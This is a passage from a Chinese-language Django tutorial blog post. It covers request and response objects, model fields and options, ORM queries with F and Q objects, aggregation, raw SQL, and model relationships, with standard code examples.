class="built_in">print</span>(request.GET)</span><br><span class="line"><span class="comment"># 返回：&lt;QueryDict: &#123;&#x27;test&#x27;: [&#x27;123&#x27;], &#x27;abc&#x27;: [&#x27;123&#x27;, &#x27;321&#x27;]&#125;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(request.GET.get(<span class="string">&#x27;abc&#x27;</span>))</span><br><span class="line"><span class="comment"># 返回：123</span></span><br><span class="line"><span class="comment"># 对于多个值的情况，仅返回最后一个值</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(request.GET.getlist(<span class="string">&#x27;abc&#x27;</span>))</span><br><span class="line"><span class="comment"># 返回：[&#x27;123&#x27;, &#x27;321&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(request.GET.<span class="built_in">dict</span>())</span><br><span class="line"><span class="comment"># 返回：&#123;&#x27;test&#x27;: &#x27;123&#x27;, &#x27;abc&#x27;: &#x27;321&#x27;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="请求体">请求体</h3><p><code>HttpRequest.body</code>获得原始的请求体的字节字符串，可用于处理非常规的HTML表单数据。对于处理传统的表单数据，应该使用<code>HttpRequest.POST</code>。</p><p><code>HttpRequest.POST</code>获取表单数据，返回值类型为QueryDict。</p><h2 id="响应-HttpResponse">响应 HttpResponse</h2><p>每个视图都要负责实例化、填充和返回一个 <code>HttpResponse</code> 对象。</p><ul><li>content，响应的正文内容</li><li>status，状态码</li><li>content-type，响应内容的MIME类型</li></ul><p>如果想返回图片，可以参考使用如下的方式：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">content = <span class="built_in">open</span>(<span class="string">&quot;a.png&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">return</span> HttpResponse(content=content, content_type=<span class="string">&quot;image/png&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="HttpResponseRedirect-重定向">HttpResponseRedirect 重定向</h3><p>接收一个url参数表明要重定向的地址。该参数除了可以使用完整的 url路径（<a href="https://www.baidu.com">https://www.baidu.com</a>），还可以使用不含域名的绝对（/admin/）/相对（admin/）路径。</p><p>另外，Django提供了针对重定向的快捷函数<code>redirect</code>。</p><p><a href="https://docs.djangoproject.com/zh-hans/3.2/topics/http/shortcuts/#redirect">Django 便捷函数 | Django 文档 | Django (djangoproject.com)</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 跳转到完全指定的URL</span></span><br><span class="line">HttpResponseRedirect(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 绝对路径，跳转到 127.0.0.1:8000/admin/</span></span><br><span class="line">HttpResponseRedirect(<span class="string">&#x27;/admin/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 相对路径，假设访问地址为127.0.0.1:8000/index，</span></span><br><span class="line"><span class="comment">#            则转到127.0.0.1:8000/index/admin/</span></span><br><span class="line">HttpResponseRedirect(<span class="string">&#x27;admin/&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="JsonResponse返回json格式的数据">JsonResponse返回json格式的数据</h2><p><em>class</em> <code>JsonResponse</code>(<em>data</em>, <em>encoder=DjangoJSONEncoder</em>, <em>safe=True</em>, <em>json_dumps_params=None</em>, **<em>kwargs</em>)</p><p>帮助创建一个 JSON 编码的响应，并将<code>Content-Type</code> 头设置为 <em>application/json</em>。</p><ul><li>如果<code>safe</code>为True，则<code>data</code>必须是一个字典，否则会引发TypeError。如果为False，则<code>data</code>可以为任何JSON 可序列化的对象。</li><li><code>encoder</code>为序列化器，可以指定其他的序列化器。</li><li><code>json_dumps_params</code> 参数是一个关键字参数的字典，用来传递给 <code>json.dumps()</code> 调用，用于生成响应。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> JsonResponse</span><br><span class="line">response = JsonResponse(&#123;<span class="string">&#x27;foo&#x27;</span>: <span class="string">&#x27;bar&#x27;</span>&#125;)</span><br><span class="line"><span class="comment"># response.content  =&gt; b&#x27;&#123;&quot;foo&quot;: &quot;bar&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1>模型层</h1><p><a href="https://docs.djangoproject.com/zh-hans/3.2/topics/db/models/">模型 | Django 文档 | Django (djangoproject.com)</a></p><h2 id="定义模型">定义模型</h2><blockquote><p>模型准确且唯一的描述了数据。它包含您储存的数据的重要字段和行为。一般来说，每一个模型都映射一张数据库表。</p></blockquote><p>自定义的模型需要继承自 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/instances/#django.db.models.Model"><code>django.db.models.Model</code></a>，其每个属性都与数据库中的字段对应。如果没有使用<code>primary_key=True</code>显式地指明主键，Django会自动给模型创建一个自增的主键。一个模型类可以按照如下方式定义：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>(models.Model):</span><br><span class="line">    first_name = models.CharField(max_length=<span class="number">30</span>)</span><br><span class="line">    last_name = models.CharField(max_length=<span class="number">30</span>)</span><br></pre></td></tr></table></figure><p>模型中的字段是某个 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/fields/#django.db.models.Field"><code>Field</code></a> 类的实例，它用于指定数据库数据类型，并且在渲染表单时会使用对应的HTML视图，另外还有基本的有效性验证功能。</p><h3 id="字段类型">字段类型</h3><p>完整文档：<a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/fields/#model-field-types">模型字段参考 | Django 文档 | Django (djangoproject.com)</a></p><p>常用的主要有以下几个字段：</p><ul><li>BooleanField<ul><li>true／false 字段</li><li>默认表单部件是 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/forms/widgets/#django.forms.CheckboxInput"><code>CheckboxInput</code></a></li></ul></li><li>CharField<ul><li>字符串字段</li><li>默认表单部件是一个 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/forms/widgets/#django.forms.TextInput"><code>TextInput</code></a></li><li><strong>需要指定max_length</strong></li><li>大的文本需要使用<strong>TextField</strong></li></ul></li><li>DateField，DateTimeField<ul><li>日期、日期时间字段</li><li>默认表单部件分别是 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/forms/widgets/#django.forms.DateInput"><code>DateInput</code></a>， <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/forms/widgets/#django.forms.DateTimeInput"><code>DateTimeInput</code></a></li><li>有三个参数可选，但不可同时使用<ul><li><strong>auto_now</strong>，每次保存对象时，自动将该字段设置为现在。适用于需要记录修改时间的情况</li><li><strong>auto_now_add</strong>，当第一次创建对象时，自动将该字段设置为现在。适用于记录创建时间的情况。指定该参数后，即使在创建对象时为该字段赋值也会被忽略。</li><li><strong>default</strong>，默认值，当创建对象时会对该字段赋值，则会使用默认值。如果想要将当前时间作为默认值使用，对于这两种字段可以分别使用**<code>date.today</code><strong>（来自datetime）和</strong><code>timezone.now</code>**（来自django.utils）</li></ul></li></ul></li><li>DecimalFiel<ul><li>一个固定精度的十进制数，在 Python 中用一个 <a href="https://docs.python.org/3/library/decimal.html#decimal.Decimal"><code>Decimal</code></a> 实例来表示。</li><li>有两个必要参数<ul><li><strong>max_digits</strong>，指定允许的最大位数</li><li><strong>decimal_places</strong>，指定小数位数</li></ul></li></ul></li><li>EmailField<ul><li>实际为一个 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/fields/#django.db.models.CharField"><code>CharField</code></a>，使用 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/validators/#django.core.validators.EmailValidator"><code>EmailValidator</code></a> 来检查该值是否为有效的电子邮件地址。</li></ul></li><li>IntegerField<ul><li>一个整数。</li><li>从 <code>-2147483648</code> 到 <code>2147483647</code> 的值在 Django 支持的所有数据库中都是安全的。</li></ul></li></ul><p>此外，<code>FileField</code>、<code>ImageField</code>、<code>TimeField</code>等也很常用。</p><h3 id="字段选项">字段选项</h3><p><a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/fields/#field-options">模型字段参考 | Django 文档 | Django (djangoproject.com)</a></p><p>可以为字段指定一些额外的参数，部分字段有其自己独有的字段选项，下面介绍的是通用的字段选项：</p><ul><li>null<ul><li>默认为 <code>False</code></li><li>如果设置为 <code>True</code>，当该字段为空时，Django 会将数据库中该字段设置为 <code>NULL</code></li></ul></li><li>blank<ul><li>默认为 <code>False</code></li><li>如果设置为 <code>True</code>，该字段允许为空。即在进行表单验证时，允许该字段为空</li></ul></li><li>choices<ul><li>一系列二元组，用作此字段的选项。如果提供了二元组，默认表单小部件是一个选择框，而不是标准文本字段，并将限制给出的选项。</li><li>比较复杂，参考文档：<a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/fields/#choices">choices</a></li></ul></li><li>db_column<ul><li>这个字段要使用的数据库列名。如果没有给出列名，Django 将使用字段名</li></ul></li><li>db_index<ul><li>如果是 <code>True</code>，将为该字段创建数据库索引</li></ul></li><li>default<ul><li>设置默认值</li><li><strong>新增字段时，必须设置该参数</strong></li></ul></li><li>primary_key<ul><li>如果设置为 <code>True</code> ，将该字段设置为该模型的主键</li></ul></li><li>unique<ul><li>如果设置为 <code>True</code>，这个字段必须在整个表中保持值唯一</li></ul></li></ul><h3 id="Meta选项">Meta选项</h3><p>可以在模型内部创建<code>Meta</code>类，来给模型赋予一些属性。</p><p><a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/options/">模型 Meta 选项 | Django 文档 | Django (djangoproject.com)</a></p><ul><li>db_table<ul><li>指定模型数据库的表的名称</li></ul></li></ul><h2 id="使用模型">使用模型</h2><ol><li><p>修改设置文件中的 <code>INSTALLED_APPS</code> ，在这个设置中添加包含 <code>models.py</code> 文件的模块名称。</p></li><li><p>使用以下命令进行数据库迁移</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python manage.py makemigrations</span><br><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure></li></ol><h2 id="操作数据库">操作数据库</h2><p><a href="https://docs.djangoproject.com/zh-hans/3.2/topics/db/queries/">执行查询 | Django 文档 | Django (djangoproject.com)</a></p><p>模型类含有一个<code>objects</code>管理器对象，数据库的增删改查都可以通过管理器实现。</p><h3 id="创建对象">创建对象</h3><p>有两种方式可以创建对象：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 使用create()方法</span></span><br><span class="line">MyModel.objects.create(arg1=val,arg2=val2,...)</span><br><span class="line"></span><br><span class="line"><span class="comment">#2. 创建实例并使用save()保存</span></span><br><span class="line">obj = MyModel(arg1=val,arg2=val2,...)</span><br><span class="line">obj.save()</span><br></pre></td></tr></table></figure><h3 id="查询">查询</h3><p>查询操作需要依赖模型的管理器对象（默认为objects），大部分情况返回的是一个<code>QuerySet</code>，内部存放模型实例。</p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td><a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/querysets/#all">all()</a></td><td>查询全部记录</td></tr><tr><td><a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/querysets/#get">get()</a></td><td>查询单个对象，直接返回对象而不是<code>QuerySet</code>。如果结果多于一条或没有则分别引发<a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/class/#django.db.models.Model.MultipleObjectsReturned"><code>Model.MultipleObjectsReturned</code></a> 和 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/class/#django.db.models.Model.DoesNotExist"><code>Model.DoesNotExist</code></a> 异常</td></tr><tr><td><a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/querysets/#filter">filter(属性1=值1,属性2=值2)</a></td><td>查询<strong>满足</strong>给定查询参数的对象，逗号表示与</td></tr><tr><td><a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/querysets/#exclude">exclude()</a></td><td>查询<strong>不满足</strong>给定查询参数的对象</td></tr><tr><td><a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/querysets/#values">values()</a></td><td>可指定要查询的列名，返回值是<code>QuerySet</code>但内部存放的是字典，如{‘列1’:值1, ‘列2’:值2}</td></tr><tr><td><a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/querysets/#values-list">values_list()</a></td><td>与values()类似，但返回的<code>QuerySet</code>内是各列的值组成的元组</td></tr><tr><td><a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/querysets/#order-by">order_by(‘-列1’,‘列2’)</a></td><td>默认升序排列，降序在列名前加’-’</td></tr></tbody></table><h4 id="自定义查找">自定义查找</h4><p>当内置的查找语句无法满足要求时（如大于、包含关系等），可以自定义查找方法。<a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/querysets/#field-lookups"><code>Field</code> 查找</a></p><p>使用方法为<code>字段__查询谓词</code></p><ul><li><p><code>__exact</code>，等值匹配</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SELECT ... WHERE id = 14;</span></span><br><span class="line">Entry.objects.get(id__exact=<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># SELECT ... WHERE id IS NULL;</span></span><br><span class="line">Entry.objects.get(id__exact=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></li><li><p><code>__contains</code>，__<code>icontains</code>， 包含指定值，<code>i</code>前缀表示不区分大小写</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SELECT ... WHERE headline LIKE &#x27;%Lennon%&#x27;;</span></span><br><span class="line">Entry.objects.get(headline__contains=<span class="string">&#x27;Lennon&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p><code>__(i)startswith</code>，<code>__(i)endswith</code>，以…开头/结尾，<code>i</code>前缀同上</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SELECT ... WHERE headline LIKE &#x27;Lennon%&#x27;;</span></span><br><span class="line">Entry.objects.<span class="built_in">filter</span>(headline__startswith=<span class="string">&#x27;Lennon&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># SELECT ... WHERE headline LIKE &#x27;%Lennon&#x27;;</span></span><br><span class="line">Entry.objects.<span class="built_in">filter</span>(headline__endswith=<span class="string">&#x27;Lennon&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p><code>__gt(e)</code>，<code>__lt(e)</code>，大于（等于）/小于（等于）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SELECT ... WHERE id &gt; 4;</span></span><br><span class="line">Entry.objects.<span class="built_in">filter</span>(id__gt=<span class="number">4</span>)</span><br></pre></td></tr></table></figure></li></ul><p>此外，还有<code>in</code>，<code>range</code>，日期查询等，详见文档。</p><h2 id="修改">修改</h2><h3 id="单个数据的修改">单个数据的修改</h3><ol><li>通过get()等方法查询得到需要修改的实例对象</li><li>修改得到的对象的属性</li><li>调用save()方法保存修改，写入数据库</li></ol><h3 id="批量修改">批量修改</h3><p>直接调用<code>QuerySet</code>的update(属性=值)方法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Update all the headlines with pub_date in 2007.</span></span><br><span class="line">Entry.objects.<span class="built_in">filter</span>(pub_date__year=<span class="number">2007</span>).update(headline=<span class="string">&#x27;Everything is the same&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="删除">删除</h2><p>与修改相似，也有单个和批量两种方式，分别调用对象和<code>QuerySet</code>的delete()方法即可。</p><p>可以使用伪删除的方式，即在模型中加一个字段标记该对象是否删除。</p><div class="note info flat"><p>在执行查询操作时需要对该字段进行过滤。</p></div><h2 id="F对象">F对象</h2><p>一个<code>F</code>对象代表数据库中某条记录的字段的信息，可以在不获取字段值的情况下对字段进行操作。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将所有记录的stories_filed加1</span></span><br><span class="line">Reporter.objects.<span class="built_in">all</span>().update(stories_filed=F(<span class="string">&#x27;stories_filed&#x27;</span>) + <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><code>F()</code>是直接委托数据库进行字段的操作，python本身不会获取字段值，因此如果要使用新值，需要调用对象的<code>refresh_from_db()</code>方法。</p><p>另外，<code>F()</code> 分配给模型字段的对象在保存模型实例后会持续存在，并将应用于每个 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/instances/#django.db.models.Model.save"><code>save()</code></a>。如：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">reporter = Reporters.objects.get(name=<span class="string">&#x27;Tintin&#x27;</span>)</span><br><span class="line">reporter.stories_filed = F(<span class="string">&#x27;stories_filed&#x27;</span>) + <span class="number">1</span></span><br><span class="line">reporter.save()</span><br><span class="line"></span><br><span class="line">reporter.name = <span class="string">&#x27;Tintin Jr.&#x27;</span></span><br><span class="line">reporter.save()</span><br></pre></td></tr></table></figure><p>在这种情况下，<code>stories_filed</code> 将被更新两次。如果最初是 <code>1</code>，最终值将是 <code>3</code>。这种持久性可以通过在保存模型对象后重新加载来避免，例如，使用 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/instances/#django.db.models.Model.refresh_from_db"><code>refresh_from_db()</code></a>。</p><h2 id="Q对象">Q对象</h2><p>使用Q对象可以执行更复杂的查询（如OR，NOT等）。</p><p><code>Q</code> 对象能通过 <code>&amp;</code> 和 <code>|</code> 操作符连接起来。当操作符被用于两个 <code>Q</code> 对象之间时会生成一个新的 <code>Q</code> 对象。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># WHERE question LIKE &#x27;Who%&#x27; OR question LIKE &#x27;What%&#x27;</span></span><br><span class="line">Q(question__startswith=<span class="string">&#x27;Who&#x27;</span>) | Q(question__startswith=<span class="string">&#x27;What&#x27;</span>)</span><br></pre></td></tr></table></figure><p>此外， <code>Q</code> 对象也可通过 <code>~</code> 操作符反转，允许在组合查询中组合普通查询或反向 (<code>NOT</code>) 查询。</p><div class="note info flat"><p>查询函数能混合使用 <code>Q</code> 对象和关键字参数。所有提供给查询函数的参数（即关键字参数或 <code>Q</code> 对象）均通过 “AND” 连接。然而，若提供了 <code>Q</code> 对象，那么它<strong>必须位于所有关键字参数之前</strong>。</p></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SELECT * from polls WHERE question LIKE &#x27;Who%&#x27;</span></span><br><span class="line"><span class="comment">#    AND (pub_date = &#x27;2005-05-02&#x27; OR pub_date = &#x27;2005-05-06&#x27;)</span></span><br><span class="line">Poll.objects.get(</span><br><span class="line">    Q(pub_date=date(<span class="number">2005</span>, <span class="number">5</span>, <span class="number">2</span>)) | Q(pub_date=date(<span class="number">2005</span>, <span class="number">5</span>, <span class="number">6</span>)),</span><br><span class="line">    question__startswith=<span class="string">&#x27;Who&#x27;</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="聚合查询">聚合查询</h2><p><a href="https://docs.djangoproject.com/zh-hans/3.2/topics/db/aggregation/">聚合 | Django 文档 | Django (djangoproject.com)</a></p><p>对部分或全部数据进行查询和操作。</p><h3 id="整表聚合">整表聚合</h3><p>支持<code>Sum</code>，<code>Avg</code>，<code>Count</code>，<code>Max</code>，<code>Min</code></p><p>语法：<code>MyModel.objects.aggregate(结果变量名=聚合函数('列'))</code>，返回字典<code>&#123;'结果变量名':值&#125;</code></p><h3 id="分组聚合">分组聚合</h3><p>指通过计算查询结果中每一个对象所关联的对象集合，从而得出总计值（或平均值等），即为查询集的每一项生成聚合。</p><p>语法：<code>QuerySet.annotate(结果变量名=聚合函数('列'))</code>，返回值为<code>QuerySet</code></p><h2 id="原生SQL操作">原生SQL操作</h2><p><a href="https://docs.djangoproject.com/zh-hans/3.2/topics/db/sql/">执行原生 SQL 查询 | Django 文档 | Django (djangoproject.com)</a></p><p>有两种方式：</p><ol><li>使用管理器的<code>raw(raw_query, params=(), translations=None)</code>方法，<strong>仅支持查询操作</strong>，返回<code>RawQuerySet</code>集合对象。</li><li>使用<strong>django.db.connection</strong>对象，该对象代表默认的数据库连接<ol><li>调用 <code>connection.cursor()</code> 来获取一个指针对象，使用完成后需要释放，因此可使用with语句</li><li>调用 <code>cursor.execute(sql, [params])</code> 来执行该 SQL</li><li>调用<code>cursor.fetchone()</code>，或 <code>cursor.fetchall()</code> 获取结果数据</li></ol></li></ol><div class="note info flat"><p>不推荐使用原生SQL操作，使用不当会遭到SQL注入攻击。</p></div><h1>模型关系</h1><p>在定义模型关系的时候，也需要指定删除该模型时，对关联模型的操作，这一行为通过字段的<code>on_delete</code>参数进行设定，主要有以下几种方式：</p><ul><li><p><strong>CASCADE</strong>，级联删除。Django <strong>模拟</strong>了 SQL 约束 ON DELETE CASCADE 的行为，也删除了包含 ForeignKey 的对象。</p></li><li><p><strong>PROTECT</strong>，通过引发 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/exceptions/#django.db.models.ProtectedError"><code>ProtectedError</code></a>，防止删除被引用对象。</p></li><li><p><strong>RESTRICT</strong>，通过引发 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/exceptions/#django.db.models.RestrictedError"><code>RestrictedError</code></a> 来防止删除被引用的对象。与 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/fields/#django.db.models.PROTECT"><code>PROTECT</code></a> 不同的是，如果被引用的对象也引用了一个在同一操作中被删除的不同对象，但通过 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/fields/#django.db.models.CASCADE"><code>CASCADE</code></a> 关系，则允许删除被引用的对象。</p></li><li><p><strong>SET_NULL</strong>，设置 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/fields/#django.db.models.ForeignKey"><code>ForeignKey</code></a> 为空；只有当 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/fields/#django.db.models.Field.null"><code>null</code></a> 为 <code>True</code> 时，才有可能。</p></li><li><p><strong>SET_DEFAULT</strong>，将 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/fields/#django.db.models.ForeignKey"><code>ForeignKey</code></a> 设置为默认值，必须为 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/fields/#django.db.models.ForeignKey"><code>ForeignKey</code></a> 设置一个默认值。</p></li><li><p><strong>SET()</strong>，将 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/fields/#django.db.models.ForeignKey"><code>ForeignKey</code></a> 设置为传递给 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/fields/#django.db.models.SET"><code>SET()</code></a> 的值，如果传递了一个可调用的值，则为调用它的结果。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth <span class="keyword">import</span> get_user_model</span><br><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sentinel_user</span>():</span><br><span class="line">    <span class="keyword">return</span> get_user_model().objects.get_or_create(username=<span class="string">&#x27;deleted&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyModel</span>(models.Model):</span><br><span class="line">    user = models.ForeignKey(</span><br><span class="line">        settings.AUTH_USER_MODEL,</span><br><span class="line">        on_delete=models.SET(get_sentinel_user),</span><br><span class="line">    )</span><br></pre></td></tr></table></figure></li><li><p><strong>DO_NOTHING</strong>，不采取任何行动。</p></li></ul><p>以下例子来源于B站视频：<a href="https://www.bilibili.com/video/BV1vK4y1o7jH?p=27">2021最新版Django全套视频（django框架快速上手）_哔哩哔哩_bilibili</a>。例子举得不错，讲解也很详细。</p><h2 id="一对一关系">一对一关系</h2><p>在模型中使用<a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/fields/#onetoonefield"><code>OneToOneField</code></a>字段实现。</p><h3 id="创建模型">创建模型</h3><p>以男性作家与其妻子是一对一的关系为例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Author</span>(models.Model):</span><br><span class="line">    name = models.CharField(max_length=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Wife</span>(models.Model):</span><br><span class="line">    name = models.CharField(max_length=<span class="number">10</span>)</span><br><span class="line">    <span class="comment"># 在任意一个模型中加入OneToOneField即可</span></span><br><span class="line">    author = models.OneToOneField(Author, on_delete=models.CASCADE)</span><br></pre></td></tr></table></figure><p>其模型关系示意图如下所示：</p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202110041500972.png!def" class="" width="250"><h3 id="创建数据">创建数据</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 无外键的模型，按正常方式创建</span></span><br><span class="line">a1 = Author.objects.create(name=<span class="string">&quot;test&quot;</span>)</span><br><span class="line">a2 = Author.objects.create(name=<span class="string">&quot;t2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有外键的模型，额外指定外键的值</span></span><br><span class="line"><span class="comment"># 法1. 用定义的字段名直接关联对象</span></span><br><span class="line">w1 = Wife.objects.create(name = <span class="string">&quot;wife&quot;</span>, author=a1)</span><br><span class="line"><span class="comment"># 法2. 关联对应的主键值</span></span><br><span class="line">w2 = Wife.objects.create(name = <span class="string">&quot;w2&quot;</span>, author_id=a2.<span class="built_in">id</span>)</span><br></pre></td></tr></table></figure><p>此时数据库中的内容如下图所示：</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202110041509846.png!def" alt="image-20211004150931770"></p><h3 id="查询数据">查询数据</h3><ul><li><p>正向查询，即直接通过外键属性查询，本例中是通过<code>Wife</code>类查找对应的<code>Author</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">w = Wife.objects.get(name=<span class="string">&#x27;wife&#x27;</span>)</span><br><span class="line"><span class="comment"># 获得对应的Author</span></span><br><span class="line">au = w.author</span><br></pre></td></tr></table></figure></li><li><p>反向查询，即没有外键的一方，调用反向属性查询关联的另一方，即<code>Author</code>查找<code>Wife</code></p><p>反向关联属性为<code>实例对象.引用类名的小写</code>，如<code>作家对象.wife</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">au = Author.objects.get(name=<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line"><span class="comment"># 获得对应的Wife</span></span><br><span class="line">wi = au.wife</span><br></pre></td></tr></table></figure></li></ul><h2 id="一对多关系">一对多关系</h2><p>在<strong>多</strong>的表上使用<a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/fields/#foreignkey">ForeignKey</a>设置外键。</p><h3 id="创建模型-2">创建模型</h3><p>以出版社和书籍是一对多的关系为例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Publisher</span>(models.Model):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 出版社，一 &quot;&quot;&quot;</span></span><br><span class="line">    name = models.CharField(max_length=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Book</span>(models.Model):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 书籍，多 &quot;&quot;&quot;</span></span><br><span class="line">    name = models.CharField(max_length=<span class="number">20</span>)</span><br><span class="line">    <span class="comment"># 定义外键</span></span><br><span class="line">    publisher = models.ForeignKey(Publisher, on_delete=models.CASCADE)</span><br></pre></td></tr></table></figure><p>其模型关系示意图如下所示:</p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202110041527058.png!def" class="" width="250"><h3 id="创建数据-2">创建数据</h3><p>先创建“一”，再创建“多”。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p1 = Publisher.objects.create(name=<span class="string">&quot;Pub1&quot;</span>)</span><br><span class="line"><span class="comment"># 直接关联对象</span></span><br><span class="line">Book.objects.create(name=<span class="string">&quot;b1&quot;</span>, publisher=p1)</span><br><span class="line"><span class="comment"># 关联主键</span></span><br><span class="line">Book.objects.create(name=<span class="string">&quot;b2&quot;</span>, publisher_id=p1.<span class="built_in">id</span>)</span><br></pre></td></tr></table></figure><p>数据库中内容如下：</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202110041532733.png!def" alt="image-20211004153218635"></p><h3 id="查询数据-2">查询数据</h3><ul><li><p>正向查询，通过<code>Book</code>查<code>Publisher</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pub = Book.objects.get(name=<span class="string">&quot;b1&quot;</span>).publisher</span><br></pre></td></tr></table></figure></li><li><p>反向查询，通过<code>Publisher</code>查<code>Book</code>，利用_set集合</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pub = Publisher.objects.get(name=<span class="string">&quot;Pub1&quot;</span>)</span><br><span class="line"><span class="comment"># 通过book_set获取对应的多个Book对象，返回QuerySet</span></span><br><span class="line">books = pub.book_set.<span class="built_in">all</span>()</span><br><span class="line"><span class="comment"># 也可通过Book的filter方法获取</span></span><br><span class="line">books = Book.objects.<span class="built_in">filter</span>(publisher=pub)</span><br></pre></td></tr></table></figure></li></ul><h2 id="多对多关系">多对多关系</h2><p>在任意一个模型中使用<a href="https://docs.djangoproject.com/zh-hans/3.2/ref/models/fields/#manytomanyfield"><code>ManyToManyField</code></a>字段。</p><h3 id="创建模型-3">创建模型</h3><p>以作者和书籍为例，一本书可以被多个作者编写，一个作者也可以编写多本书。</p><p>如果手动创建这种关系，需要第三张表来记录两个模型之间的关系，而Django会自动帮助我们创建这第三张表，因此仍然只要定义两个模型即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span 